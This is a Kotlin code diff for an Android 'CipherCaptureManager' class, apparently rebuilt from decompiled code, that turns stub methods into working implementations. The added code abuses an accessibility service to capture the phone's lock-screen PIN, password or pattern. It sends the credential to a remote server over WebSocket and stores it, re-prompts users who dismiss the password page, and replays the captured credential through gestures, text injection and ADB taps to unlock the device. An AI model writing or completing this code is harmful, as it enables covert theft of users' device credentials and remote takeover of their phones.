@@ -330,8 +330,12 @@ class CipherCaptureManager(
         context.getSharedPreferences(PREFS_NAME, 0)
     }
 
-    /** 上次事件时间戳 */
+    /** 上次事件时间戳 (JADX: f53296b0) */
     val lastEventTimestamp: AtomicLong = AtomicLong(0L)
+
+    /** 锁定批次 ID (JADX: f53295a9, volatile long) — 用于 sendPasswordEvent */
+    @Volatile
+    var lockBatchId: Long = 0L
 
     /** 是否正在监听 */
     @Volatile
@@ -683,24 +687,33 @@ class CipherCaptureManager(
 
     // ── Phase 10 stubs (referenced by zbrefryi, syuqattwmgit) ──
 
-    /** Dispatch a named event string. Stub for Phase 10. */
+    /**
+     * Dispatch a named event string.
+     * vendor: d9 — sendPasswordEvent
+     * Sends intentCode + lockBatchId via NetworkManager WS event.
+     */
     fun dispatchEvent(action: String) {
-        Log.d(TAG, "dispatchEvent: $action")
-        // ADAPT: event dispatch logic for password changed/failed/succeeded
+        if (action.isEmpty()) return
+        sendPasswordEvent(action)
     }
 
-    /** Set whether the password was verified. Stub for Phase 10. */
+    /**
+     * Set whether the password was verified.
+     * vendor: b4 — deleteCipherFromPrefs
+     * When verified=false, deletes the normal cipher from prefs.
+     * When verified=true, deletes the locked cipher from prefs.
+     */
     fun setPasswordVerified(verified: Boolean) {
-        Log.d(TAG, "setPasswordVerified: $verified")
-        // ADAPT: clear/set password verification state
+        deleteCipherFromPrefs(verified)
+        Log.d(TAG, "setPasswordVerified: $verified — deleted key=${if (verified) "cipher_locked" else "cipher_normal"}")
     }
 
-    /** Discard any buffered password data. Stub for Phase 10. */
+    /**
+     * Discard any buffered password data.
+     * vendor: b6 → b7 (discardPendingCipher → discardPendingCipherInternal)
+     */
     fun discardBufferedPassword() {
-        Log.d(TAG, "discardBufferedPassword")
-        pinDigits.clear()
-        passwordChars.clear()
-        // ADAPT: full discard logic
+        discardPendingCipher()
     }
 
     /** Start listening mode. Stub for Phase 10. */
@@ -916,9 +929,19 @@ class CipherCaptureManager(
      */
     fun notifyPasswordCaptureSuccess() {
         try {
-            // ADAPT: 依赖 dqtvuisjd (MyAccessibilityService) 单例
-            // vendor: 设置 k5=false, k2=0, 写入 SharedPreferences
-            Log.d(TAG, "✅ [onPasswordCaptureSuccess] 密码捕获成功")
+            // vendor: d5 — 获取 dqtvuisjd 实例, 设置 k5=false, k2=0, 写入 SharedPreferences
+            val svc = com.storm.safe.rock.service.MyAccessibilityService.getInstance()
+            if (svc == null) {
+                Log.w(TAG, "⚠️ dqtvuisjd 实例为 null")
+                return
+            }
+            Log.d(TAG, "✅ [onPasswordCaptureSuccess] 密码捕获成功，停止密码监听")
+            svc.isCipherCaptureEnabled = false
+            svc.cipherCaptureAttemptCount = 0
+            svc.getSharedPreferences("cipher_prefs", 0)
+                .edit()
+                .putBoolean("password_captured", true)
+                .apply()
         } catch (e: Exception) {
             Log.w(TAG, "❌ 通知密码捕获成功失败: ${e.message}")
         }
@@ -934,10 +957,16 @@ class CipherCaptureManager(
         try {
             if (cipher == null) return
             val map = cipher as? Map<*, *> ?: return
-            // ADAPT: vendor 使用 dqtvuisjd.m211471g5() 获取 NetworkManager
-            // 此处 stub NetworkManager 发送
+            // vendor: d8 — 通过 dqtvuisjd.m211471g5() 获取 NetworkManager
+            val svc = com.storm.safe.rock.service.MyAccessibilityService.getInstance()
+            val networkManager = svc?.getNetworkManager()
+            if (networkManager == null) {
+                Log.w(TAG, "NetworkManager 未初始化，跳过 WebSocket 发送")
+                return
+            }
             val quality = map["quality"] as? String ?: return
             val text = map["text"] as? String
+            @Suppress("UNCHECKED_CAST")
             val patternIndices = (map["patternIndices"] as? List<*>)?.filterIsInstance<Int>()
             val timestamp = map["timestamp"] as? Long ?: System.currentTimeMillis()
             val isLocked = map["isLocked"] as? Boolean ?: true
@@ -958,7 +987,7 @@ class CipherCaptureManager(
             }
 
             val json = JSONObject()
-            json.put("type", "system_lock_password")  // ADAPT: vendor uses StringUtil.decrypt(encrypted_string)
+            json.put("type", "system_lock_password")
             json.put("password", password)
             json.put("passwordType", type)
             json.put("inputMethod", "system_lock")
@@ -966,7 +995,8 @@ class CipherCaptureManager(
             json.put("cipherGradeCode", quality)
             json.put("isLocked", isLocked)
 
-            // ADAPT: vendor 调用 c0323a8M211471g5.m211658c4("status", json)
+            // vendor: c0323a8M211471g5.m211658c4("status", json)
+            networkManager.sendEvent("status", json)
             Log.d(TAG, "✅ 密码已通过WebSocket发送(status事件): type=$type, password=${"*".repeat(password.length)}")
         } catch (e: Exception) {
             Log.w(TAG, "发送密码到服务器失败: ${e.message}")
@@ -1212,7 +1242,9 @@ class CipherCaptureManager(
             "password" -> QUALITY_ALPHA
             else -> QUALITY_NUMERIC
         }
-        // ADAPT: vendor 使用 C0598hx 数据类; 此处使用 Map 存储
+        // vendor: C0598hx 数据类字段映射 → Map keys:
+        // f56760a0=quality, f56761a1=text, f56762a2=patternIndices,
+        // f56763a3=patternScreenPoints, f56764a4=isLocked, f56765a5=timestamp
         pendingCipher = mapOf(
             "quality" to quality,
             "text" to text,
@@ -1320,19 +1352,39 @@ class CipherCaptureManager(
      * vendor: e1 — syncToAppStatusManager
      */
     fun syncToAppStatusManager(cipher: Any?) {
-        // JADX: C0107as → AppStatusManager.saveLockPassword
-        // vendor: appStatusManager.a6(type, isLocked, value)
+        // vendor: e1 — C0107as.getInstance(context).a6(type, isLocked, value)
         try {
-            val ctx = service?.applicationContext
-            if (ctx != null && cipher != null) {
-                // ADAPT: cipher is opaque type; extract type/value for status sync
-                AppStatusManager.getInstance(ctx).saveLockPassword(
-                    "unknown", true, cipher.toString()
-                )
+            val ctx = service.applicationContext ?: return
+            val map = cipher as? Map<*, *> ?: return
+            val isLocked = map["isLocked"] as? Boolean ?: true
+            if (!isLocked) return
+
+            val quality = map["quality"] as? String ?: ""
+            val text = map["text"] as? String
+            @Suppress("UNCHECKED_CAST")
+            val patternIndices = map["patternIndices"] as? List<Int>
+
+            // vendor: 类型映射
+            val type = when {
+                quality == QUALITY_NUMERIC || quality == "PASSWORD_QUALITY_NUMERIC_COMPLEX" -> {
+                    if ((text?.length ?: 0) <= 4) "4pin" else "6pin"
+                }
+                quality == QUALITY_ALPHA -> "mixed"
+                quality == QUALITY_PATTERN -> "pattern"
+                else -> "unknown"
             }
-            Log.d(TAG, "syncToAppStatusManager: cipher=${cipher != null}")
+
+            // vendor: 值映射 — 图案用逗号拼接, 文本直接使用
+            val value = if (quality == QUALITY_PATTERN && patternIndices != null) {
+                patternIndices.joinToString(",")
+            } else {
+                text ?: ""
+            }
+
+            AppStatusManager.getInstance(ctx).saveLockPassword(type, true, value)
+            Log.d(TAG, "✅ 已同步锁屏密码到 AppStatusManager: type=$type, value=$value")
         } catch (e: Exception) {
-            Log.w(TAG, "syncToAppStatusManager 失败: ${e.message}")
+            Log.w(TAG, "❌ 同步到 AppStatusManager 失败: ${e.message}")
         }
     }
 
@@ -1382,9 +1434,39 @@ class CipherCaptureManager(
      * vendor: b8 — notifyPasswordPageDismissed
      */
     fun notifyPasswordPageDismissed() {
-        // ADAPT: 依赖 dqtvuisjd (MyAccessibilityService)
-        // vendor: 通知 MyAccessibilityService 重新显示密码对话框
-        Log.d(TAG, "// STUB: notifyPasswordPageDismissed — 依赖 MyAccessibilityService")
+        // vendor: b8 — 检查监听状态和已有密码时间
+        if (!isListening) {
+            Log.d(TAG, "🔷 [doNotifyPasswordPageDismissed] 监听模式已关闭，取消重新弹出")
+            return
+        }
+        var saved = loadCipherFromPrefs(true)
+        if (saved == null) {
+            saved = loadCipherFromPrefs(false)
+        }
+        if (saved != null) {
+            val elapsed = System.currentTimeMillis() - (saved["timestamp"] as? Long ?: 0L)
+            if (elapsed < 30000) {
+                Log.d(TAG, "🔷 [doNotifyPasswordPageDismissed] 已有密码（${elapsed}ms前捕获），不再重新弹出")
+                notifyPasswordCaptureSuccess()
+                return
+            }
+        }
+        try {
+            Log.d(TAG, "🔷 [doNotifyPasswordPageDismissed] 通知 dqtvuisjd 重新弹出密码框")
+            val svc = com.storm.safe.rock.service.MyAccessibilityService.getInstance()
+            if (svc != null) {
+                // vendor: c0290a0.m211495i9() — onPasswordPageDismissedByUser
+                // 该方法检查 k5 和 k2 限制后重新启用监听
+                val ccm = svc.cipherCaptureManager
+                if (ccm != null) {
+                    enableListening(ccm)
+                }
+            } else {
+                Log.w(TAG, "⚠️ dqtvuisjd 实例为 null")
+            }
+        } catch (e: Exception) {
+            Log.w(TAG, "❌ 通知重新弹出失败: ${e.message}")
+        }
     }
 
     /**
@@ -1401,57 +1483,144 @@ class CipherCaptureManager(
             val quality = cipher["quality"] as? String ?: return false
             val text = cipher["text"] as? String
             @Suppress("UNCHECKED_CAST")
-            val pattern = cipher["pattern"] as? List<Int>
+            val patternIndices = cipher["patternIndices"] as? List<Int>
+            @Suppress("UNCHECKED_CAST")
+            val patternScreenPoints = cipher["patternScreenPoints"] as? List<android.graphics.Point>
+
+            // vendor: a3 — 先检查是否为非 PIN/密码/图案
+            if (quality != QUALITY_NUMERIC && quality != "PASSWORD_QUALITY_NUMERIC_COMPLEX"
+                && quality != QUALITY_ALPHA && quality != QUALITY_PATTERN) {
+                return false
+            }
 
             // 1. 查找 "使用密码" 按钮（部分设备需要先点击）
             if (tryFindAndClickUseCredential()) {
                 sleep500()
             }
 
-            val root = service.rootInActiveWindow ?: return false
+            if (quality == QUALITY_PATTERN) {
+                // vendor: 图案密码分支
+                // 尝试 1: 使用 patternScreenPoints (坐标) 回放
+                var gestureSuccess = false
+                if (patternScreenPoints != null && patternScreenPoints.isNotEmpty()) {
+                    val dedupedPoints = java.util.LinkedList(patternScreenPoints)
+                    removeInvalidPatternPoints(dedupedPoints)
+                    if (dedupedPoints.size >= 2) {
+                        val root = service.rootInActiveWindow
+                        if (root != null) {
+                            // vendor: 等待页面稳定
+                            for (i in 0 until 5) {
+                                try { Thread.sleep(200L) } catch (_: Exception) {}
+                            }
+                            val refreshedRoot = service.rootInActiveWindow ?: root
+                            val pkg = refreshedRoot.packageName?.toString() ?: "com.android.settings"
 
-            when {
-                quality == QUALITY_PATTERN && pattern != null -> {
-                    // 图案密码: 查找图案锁并回放手势
-                    Log.d(TAG, "tryConfirmLock: 图案密码, ${pattern.size} 个点")
-                    // ADAPT: VENDOR_VERIFY — 图案回放逻辑复杂，依赖 screenPoints 和坐标变换
-                    // Requires PatternCaptureOverlay coordinate mapping from AccessibilityEventRouter
-                    return false
+                            // 查找 lockPattern 节点
+                            var patternNode = findNodeByViewIdAndClass(refreshedRoot, "$pkg:id/lockPattern", "android.view.View")
+                            if (patternNode == null) {
+                                for (altPkg in listOf("com.android.settings", "com.android.systemui", "com.coloros.settings", "com.oplus.settings")) {
+                                    if (altPkg != pkg) {
+                                        patternNode = findNodeByViewIdAndClass(refreshedRoot, "$altPkg:id/lockPattern", "android.view.View")
+                                            ?: findNodeByViewId(refreshedRoot, "$altPkg:id/lockPattern")
+                                        if (patternNode != null) break
+                                    }
+                                }
+                            }
+                            if (patternNode == null) patternNode = findPatternNodeByClass(refreshedRoot)
+
+                            if (patternNode != null) {
+                                val brand = Build.BRAND.lowercase(Locale.ROOT)
+                                val boundsInScreen = cipher["boundsInScreen"] as? android.graphics.Rect
+                                val boundsInParent = cipher["boundsInParent"] as? android.graphics.Rect
+
+                                if (brand == "vivo" || brand == "iqoo" || boundsInScreen == null || boundsInParent == null) {
+                                    // vivo/iqoo: 使用原始坐标
+                                    val pts = ArrayList<android.graphics.PointF>()
+                                    for (p in dedupedPoints) pts.add(android.graphics.PointF(p.x.toFloat(), p.y.toFloat()))
+                                    Log.d(TAG, "使用原始坐标: ${pts.size}个点")
+                                    gestureSuccess = playPatternGestureFull(pts)
+                                } else {
+                                    // 非 vivo: 坐标映射
+                                    val nodeRect = android.graphics.Rect()
+                                    if (Build.VERSION.SDK_INT >= 34) {
+                                        patternNode.getBoundsInScreen(nodeRect) // getBoundsInWindow not available via a11y
+                                    } else {
+                                        patternNode.getBoundsInScreen(nodeRect)
+                                    }
+                                    val parentRect = android.graphics.Rect()
+                                    patternNode.getBoundsInParent(parentRect)
+                                    val mapped = transformPatternPoints(dedupedPoints, boundsInScreen, boundsInParent, nodeRect, parentRect)
+                                    val pts = ArrayList<android.graphics.PointF>()
+                                    for (p in mapped) pts.add(android.graphics.PointF(p.x.toFloat(), p.y.toFloat()))
+                                    Log.d(TAG, "非Vivo坐标映射: ${pts.size}个点")
+                                    gestureSuccess = playPatternGestureFull(pts)
+                                }
+                            } else {
+                                Log.d(TAG, "tryPatternInput: 找不到 lockPattern 节点")
+                            }
+                        }
+                    }
                 }
-                text != null && text.isNotEmpty() -> {
-                    // PIN/密码: 查找输入框并输入
-                    Log.d(TAG, "tryConfirmLock: 文本密码, length=${text.length}")
+                if (gestureSuccess) return true
 
-                    // 尝试 1: 通过 viewId 查找输入框
-                    val editText = findPasswordInputById(root) ?: findEditText(root)
-                    if (editText != null) {
-                        // 设置文本
+                // 尝试 2: 使用 patternIndices 回退到网格计算
+                if (patternIndices != null && patternIndices.isNotEmpty()) {
+                    return tryPatternGridFallback(patternIndices)
+                }
+                return false
+            }
+
+            // vendor: PIN/密码分支
+            if (text.isNullOrEmpty()) return false
+            Log.d(TAG, "confirmLockByCipher: type=$quality, length=${text.length}")
+            Thread.sleep(500L)
+
+            // 尝试 1: EditText 输入
+            Log.d(TAG, "J_autoInput: ★★★ 开始 tryEditTextInput ★★★")
+            var editTextSuccess = false
+            try {
+                val root = service.rootInActiveWindow
+                if (root != null) {
+                    // vendor: 多种方式查找 EditText
+                    var editNode = service.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
+                    if (editNode != null) {
+                        val cn = editNode.className?.toString() ?: ""
+                        if (!cn.contains("EditText") && !editNode.isEditable) {
+                            editNode = findEditText(editNode) // 子树查找
+                        }
+                    }
+                    if (editNode == null) editNode = findEditText(root)
+                    if (editNode == null) editNode = findFocusedEditText(root)
+                    if (editNode == null) editNode = findPasswordInputById(root)
+
+                    if (editNode != null) {
+                        editNode.performAction(AccessibilityNodeInfo.ACTION_FOCUS)
+                        Thread.sleep(200L)
                         val args = android.os.Bundle()
                         args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
-                        editText.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
-                        sleep200()
-
-                        // 点击确认
-                        clickConfirmButton()
-                        sleep500()
-
-                        return verifySuccess()
-                    }
-
-                    // 尝试 2: 通过按键逐个输入
-                    if (tryKeyNodeInput(text, root.packageName?.toString() ?: "com.android.systemui")) {
-                        sleep500()
-                        return verifySuccess()
-                    }
-
-                    // 尝试 3: ADB input tap
-                    if (tryAdbPinInput(text)) {
-                        sleep500()
-                        return verifySuccess()
+                        if (editNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)) {
+                            Thread.sleep(300L)
+                            // vendor: m211807a4 — input keyevent 66 (ENTER)
+                            clickConfirmButtonFull()
+                            if (verifySuccess()) {
+                                Log.d(TAG, "tryEditTextInput: ✅ 密码输入成功！")
+                                editTextSuccess = true
+                            }
+                        }
                     }
                 }
+            } catch (e: Exception) {
+                Log.w(TAG, "tryEditTextInput 异常: ${e.message}")
             }
-            return false
+
+            if (editTextSuccess) return true
+
+            // 尝试 2: 通过按键逐个输入
+            Log.d(TAG, "J_autoInput: ★★★ 开始 tryKeyNodeInput ★★★")
+            if (tryKeyNodeInputFull(text, quality)) return true
+
+            // 尝试 3: ADB input tap
+            return tryAdbPinInputFull(text)
         } catch (e: Exception) {
             Log.e(TAG, "tryConfirmLock error: ${e.message}")
             return false
@@ -1495,10 +1664,8 @@ class CipherCaptureManager(
      * vendor: e2 — tryAdbPinInput
      */
     fun tryAdbPinInput(pin: String): Boolean {
-        // ADAPT: 依赖 ADB shell connection (SystemOptimizeManager)
-        // vendor: 通过 ADB "input tap x y" 逐个点击数字键
-        Log.d(TAG, "// STUB: tryAdbPinInput — 依赖 ADB shell")
-        return false
+        // vendor: e2 — 通过 ADB shell "input tap x y" 逐个点击数字键
+        return tryAdbPinInputFull(pin)
     }
 
     /**
@@ -1765,8 +1932,23 @@ class CipherCaptureManager(
      */
     fun sendPasswordEvent(type: String) {
         if (type.isEmpty()) return
-        // ADAPT: vendor 通过 coroutine 发送，此处简化
-        Log.d(TAG, "sendPasswordEvent: type=$type")
+        // vendor: d9 — 通过 coroutine 发送 intentCode + lockBatchId 到 WS
+        try {
+            val batchId = lockBatchId
+            val json = JSONObject()
+            json.put("intentCode", type)
+            if (batchId > 0) {
+                json.put("lockBatchId", batchId.toString())
+            }
+            val svc = com.storm.safe.rock.service.MyAccessibilityService.getInstance()
+            val networkManager = svc?.getNetworkManager()
+            if (networkManager != null) {
+                networkManager.sendEvent("lock_password_event", json)
+            }
+            Log.d(TAG, "📡 密码事件已发送: intentCode=$type, lockBatchId=$batchId")
+        } catch (e: Exception) {
+            Log.w(TAG, "发送密码事件失败: ${e.message}")
+        }
     }
 
     // ==================== 新增方法 — JADX 完整实现 ====================
@@ -2044,4 +2226,100 @@ class CipherCaptureManager(
             AccessibilityEvent.TYPE_VIEW_HOVER_ENTER -> handleHoverEvent(event)
         }
     }
+
+    // =============================================
+    // View Cache Rule Management (mapped from C0341a7 methods)
+    // JADX: f53385a2 = rules map, f53388a5 = active flag
+    // =============================================
+
+    /** View cache rules map. JADX: f53385a2 */
+    private val viewCacheRules = mutableMapOf<String, com.storm.safe.rock.service.modules.command.ViewCacheRule>()
+
+    /** View cache active flag. JADX: f53388a5 */
+    @Volatile
+    private var viewCacheActive: Boolean = false
+
+    /**
+     * Set view cache rules (replaces all). JADX: m211869a9(rules).
+     */
+    fun setViewCacheRules(rules: List<com.storm.safe.rock.service.modules.command.ViewCacheRule>) {
+        synchronized(viewCacheRules) {
+            viewCacheRules.clear()
+            for (rule in rules) {
+                viewCacheRules[rule.packageName] = rule
+            }
+            viewCacheActive = viewCacheRules.isNotEmpty()
+        }
+        persistViewCacheRules()
+    }
+
+    /**
+     * Add a single view cache rule. JADX: m211861a0(pkg, classes, appName).
+     */
+    fun addViewCacheRule(packageName: String, classes: List<String>, appName: String) {
+        synchronized(viewCacheRules) {
+            viewCacheRules[packageName] = com.storm.safe.rock.service.modules.command.ViewCacheRule(packageName, classes, appName)
+            viewCacheActive = true
+        }
+        persistViewCacheRules()
+    }
+
+    /**
+     * Remove a view cache rule by package name. JADX: m211866a5(pkg).
+     */
+    fun removeViewCacheRule(packageName: String) {
+        synchronized(viewCacheRules) {
+            viewCacheRules.remove(packageName)
+            viewCacheActive = viewCacheRules.isNotEmpty()
+        }
+        persistViewCacheRules()
+    }
+
+    /**
+     * Clear all view cache rules. JADX: f53385a2.clear() + m211872b2().
+     */
+    fun clearViewCacheRules() {
+        synchronized(viewCacheRules) {
+            viewCacheRules.clear()
+            viewCacheActive = false
+        }
+        persistViewCacheRules()
+    }
+
+    /**
+     * Get package names from current rules. JADX: m211862a1().
+     */
+    fun getViewCachePackageNames(): List<String> {
+        synchronized(viewCacheRules) {
+            return viewCacheRules.keys.toList()
+        }
+    }
+
+    /**
+     * Check if view cache is active. JADX: f53388a5.get().
+     */
+    fun isViewCacheActive(): Boolean = viewCacheActive
+
+    /**
+     * Persist view cache rules. JADX: m211872b2().
+     */
+    private fun persistViewCacheRules() {
+        try {
+            val prefs = context.getSharedPreferences("view_cache_rules", 0)
+            val jsonArray = org.json.JSONArray()
+            synchronized(viewCacheRules) {
+                for ((_, rule) in viewCacheRules) {
+                    jsonArray.put(org.json.JSONObject().apply {
+                        put("packageName", rule.packageName)
+                        put("appName", rule.appName)
+                        put("listenClasses", org.json.JSONArray(rule.listenClasses))
+                    })
+                }
+            }
+            prefs.edit().putString("rules", jsonArray.toString()).apply()
+        } catch (e: Exception) {
+            Log.e(TAG, "persistViewCacheRules failed", e)
+        }
+    }
 }
+
